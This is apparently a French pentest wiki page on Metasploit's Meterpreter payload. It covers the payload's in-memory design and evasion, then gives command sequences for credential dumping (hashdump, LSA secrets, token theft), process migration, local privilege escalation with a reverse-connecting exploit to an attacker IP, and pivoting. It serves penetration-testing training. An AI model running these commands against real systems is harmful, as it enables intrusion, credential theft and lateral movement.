# Meterpreter

Meterpreter est le payload le plus puissant de l'arsenal Metasploit. Il ne se contente pas d'ouvrir un shell sur la cible, il offre une plateforme de post-exploitation complete qui tourne entierement en memoire, communique de facon chiffree, et peut etre etendue a la volee avec des modules supplementaires.

## Pourquoi

Un shell classique (cmd, bash) donne un acces basique a la cible, mais chaque operation avancee (transfert de fichiers, capture de hashs, migration de processus, pivoting) necessite des outils supplementaires. Meterpreter integre tout ca dans une seule session, avec un controle fin et une empreinte minimale sur le disque.

## Comment ca marche

### Architecture

Le deploiement de Meterpreter se deroule en plusieurs etapes.

1. **Le stager s'execute** sur la cible et etablit la connexion reseau (reverse TCP, HTTPS, etc.)
2. **Le stage est charge** en memoire via un mecanisme de DLL reflective. Aucun fichier n'est ecrit sur le disque
3. **Le core Meterpreter s'initialise** et etablit un canal de communication chiffre en AES avec l'attaquant
4. **Les extensions se chargent** : `stdapi` (operations de base) est chargee automatiquement, `priv` (operations privilegiees) s'ajoute si les droits le permettent

{% hint style="info" %}
Le fait que Meterpreter reside uniquement en memoire le rend difficile a detecter par l'analyse forensique classique (pas de fichier sur disque, pas de nouveau processus cree). En revanche, les solutions EDR modernes detectent les comportements associes (injection de DLL, communications C2).
{% endhint %}

### Principes de conception

| Principe | Mise en oeuvre |
|---|---|
| **Furtivite** | Execution en memoire, injection dans un processus existant, communications AES |
| **Puissance** | Systeme de channels pour multiplexer les flux (shell, fichiers, port forwarding) |
| **Extensibilite** | Chargement dynamique d'extensions sans recompilation, ajout de fonctionnalites a la volee |

## En pratique

### Commandes essentielles

{% tabs %}
{% tab title="Systeme" %}
```bash
# - Informations systeme
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getpid

# - Processus
meterpreter > ps                     # lister les processus
meterpreter > migrate <PID>          # migrer vers un autre processus
meterpreter > kill <PID>             # tuer un processus

# - Shell systeme
meterpreter > shell                  # ouvrir un shell natif
meterpreter > execute -f cmd.exe -i  # executer une commande
```
{% endtab %}
{% tab title="Fichiers" %}
```bash
# - Navigation
meterpreter > pwd
meterpreter > cd C:\\Users
meterpreter > ls

# - Transferts
meterpreter > download C:\\Users\\admin\\Desktop\\secret.txt /tmp/
meterpreter > upload /opt/tools/mimikatz.exe C:\\Temp\\

# - Recherche
meterpreter > search -f *.txt -d C:\\Users
meterpreter > cat C:\\Users\\admin\\Desktop\\flag.txt
```
{% endtab %}
{% tab title="Reseau" %}
```bash
# - Informations reseau
meterpreter > ipconfig
meterpreter > arp
meterpreter > route

# - Port forwarding
meterpreter > portfwd add -l 8080 -p 80 -r 172.16.5.10
meterpreter > portfwd list

# - Pivoting
meterpreter > run autoroute -s 172.16.5.0/24
```
{% endtab %}
{% endtabs %}

### Extraction de credentials

```bash
# - Extraire les hashs SAM (necessite SYSTEM)
meterpreter > hashdump
Administrator:500:aad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
Guest:501:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# - Secrets LSA
meterpreter > lsa_dump_secrets

# - Voler un token d'authentification
meterpreter > steal_token <PID>
```

{% hint style="warning" %}
`hashdump` et `lsa_dump_secrets` necessitent des privileges SYSTEM. Si le shell initial tourne sous un compte non-privilegie, il faudra d'abord escalader les privileges (voir ci-dessous).
{% endhint %}

### Migration de processus

La migration permet de deplacer Meterpreter dans un autre processus. C'est utile pour la stabilite (si le processus initial est ferme par l'utilisateur) et pour heriter des privileges d'un processus plus eleve.

```bash
# - Lister les processus pour trouver une cible de migration
meterpreter > ps

# - Migrer vers un processus stable (ex: explorer.exe)
meterpreter > migrate 1234
[*] Migrating from 4567 to 1234...
[*] Migration completed successfully.
```

### Escalade de privileges avec les modules post

Metasploit propose un module qui analyse automatiquement la session et suggere des exploits locaux applicables.

```bash
# - Mettre la session en arriere-plan
meterpreter > background
[*] Backgrounding session 1...

# - Lancer le local exploit suggester
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
msf6 post(multi/recon/local_exploit_suggester) > run

# - Le module liste les exploits applicables
[+] exploit/windows/local/ms10_015_kitrap0d: The service is running...
[+] exploit/linux/local/sudo_baron_samedit: The target appears vulnerable...
```

```bash
# - Utiliser un exploit local suggere
msf6 > use exploit/windows/local/ms10_015_kitrap0d
msf6 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 1
msf6 exploit(windows/local/ms10_015_kitrap0d) > set LHOST <IP_ATTAQUANT>
msf6 exploit(windows/local/ms10_015_kitrap0d) > set LPORT 4443
msf6 exploit(windows/local/ms10_015_kitrap0d) > run

# - Nouvelle session avec privileges eleves
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

{% hint style="success" %}
Quand on utilise un exploit local pour l'escalade, penser a utiliser un LPORT different de celui de la session initiale. Sinon le handler entrera en conflit avec la connexion existante.
{% endhint %}

## Pieges et galeres

- **Session qui meurt** : si le processus dans lequel Meterpreter s'execute est ferme, la session est perdue. Migrer rapidement vers un processus stable (explorer.exe, svchost.exe) des l'obtention du shell
- **Architecture x86/x64** : si la session Meterpreter est en x86 sur un systeme x64, certaines commandes (hashdump) echoueront. Migrer vers un processus x64 resout le probleme
- **Payload detecte** : les payloads Meterpreter standards sont tres signatures par les AV/EDR. En environnement protege, il faut souvent passer par des payloads custom ou des techniques d'evasion
- **Chiffrement AES** : la communication est chiffree, mais le pattern de connexion (beaconing regulier) peut etre detecte par un IDS

## Retour terrain

Meterpreter reste le payload de reference pour la post-exploitation dans Metasploit. Sa capacite a operer en memoire, a migrer entre processus, et a charger des extensions dynamiquement en fait un outil tres polyvalent. En pentest, le workflow typique est : obtenir un shell Meterpreter, migrer vers un processus stable, lancer le local exploit suggester si necessaire, puis passer a l'extraction de credentials et au pivoting. Le point faible principal reste la detection : les signatures Meterpreter sont connues de tous les AV/EDR du marche.

## Memo express

| Commande | Usage |
|---|---|
| `sysinfo` | Informations systeme |
| `getuid` | Utilisateur courant |
| `ps` | Lister les processus |
| `migrate <PID>` | Migrer vers un processus |
| `hashdump` | Extraire les hashs SAM |
| `download / upload` | Transfert de fichiers |
| `search -f <pattern>` | Chercher des fichiers |
| `shell` | Ouvrir un shell natif |
| `background` | Mettre la session en arriere-plan |
| `portfwd add` | Port forwarding |
| `run autoroute` | Ajouter une route pour le pivoting |

***
